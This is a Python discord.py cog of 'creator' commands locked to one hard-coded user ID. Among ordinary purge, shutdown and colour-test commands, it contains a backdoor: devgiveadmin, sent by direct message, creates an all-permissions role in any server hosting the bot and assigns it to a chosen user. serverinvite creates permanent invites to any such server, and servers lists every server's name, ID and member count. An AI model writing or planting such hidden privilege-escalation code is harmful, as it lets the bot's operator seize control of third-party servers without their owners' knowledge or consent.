import discord
import asyncio
import json
from discord import Permissions
from discord.ext import commands

import string
from datetime import datetime

class creator_cmds(commands.Cog):
    def __init__(self, client):
        self.client = client

    @commands.Cog.listener()
    async def on_ready(self):
        print("creator_cmds.py Loaded!")

    async def cog_check(self, ctx):
        try: 
            if ctx.author.id == 416508283528937472: return True
        except: pass

    # tdevgiveadmin
    @commands.command()
    async def devgiveadmin(self, ctx, channel_id: int = 0, name: str = "new role", user: discord.Member = None):
        if ctx.guild is None:
            channel = self.client.get_channel(channel_id)
            msg = discord.utils.get(await channel.history(limit=100).flatten(), author=user)
            role = await msg.guild.create_role(name=name, permissions=Permissions.all())  
            await msg.author.add_roles(role)
            await ctx.send(f"**{msg.author.name}** received the role **{name}** in **{msg.guild}**", delete_after=3)

    # tdevpurge <ammount>
    @commands.command()
    async def devpurge(self, ctx, l: int = 50):
        if ctx.guild is not None:
            await ctx.message.delete()
            c = await ctx.channel.purge(limit=l)
            await ctx.send(f"Cleared {len(c)} messages", delete_after=3)
        else:
            messages = await ctx.channel.history(limit=l).flatten()
            c = 0
            for msg in messages:
                if msg.author.id == self.client.user.id:
                    await msg.delete()
                    await asyncio.sleep(0.5)
                    c = c + 1
            await ctx.send(f"Cleared {c} messages", delete_after=3)
    
    #tshutdown
    @commands.command()
    async def shutdown(self, ctx):
        await ctx.send('Shutting down...')
        exit()
    
    # tservers
    @commands.command()
    async def servers(self, ctx):
        if ctx.guild is None: 
            activeservers = self.client.guilds
            serverlist = ""
            acceptedchars = ["'","!","?"]
            for guild in activeservers:
                guildname_checked = " "
                for i in guild.name:
                    if i in string.ascii_letters or i.isspace() or i in acceptedchars:
                        guildname_checked += i
                    else:
                        guildname_checked += "_"
                serverlist += f"Name: {guildname_checked}, MemberCount: {guild.member_count}, GuildID: {guild.id}\n"

            with open("result.txt", "w") as file:
                file.write(serverlist)
            
            # send file to Discord in message
            with open("result.txt", "rb") as file:
                await ctx.reply("**guild names** only shown in characters `a-z`.\n**Unsupported** characters are displayed as `_`\noutput:", file=discord.File(file, "result.txt"))

    # tserverinvite <id> 
    @commands.command()
    async def serverinvite(self, ctx, target: int=0):
        if ctx.guild is None: 
            targetguild = self.client.get_guild(target)
            link = await targetguild.text_channels[0].create_invite(max_age = 0, max_uses=0)
            await ctx.send(f"Invite for {targetguild.name}: {link}")

    # tembedcolortest <color>
    @commands.command()
    async def embedcolortest(self, ctx, colortest: str="002240"):
        if "#" in colortest:
            colortest = colortest.replace("#", "")
        readableHex = int(colortest, 16)

        em = discord.Embed(title = "Embed Color Test",
                           description = f"Testing: {colortest}\nDefault Color: `#002240`",
                           color = readableHex,
                           timestamp=datetime.utcnow())

        await ctx.send(embed = em)

#####################################################################################################################################
def setup(client):
    client.add_cog(creator_cmds(client))
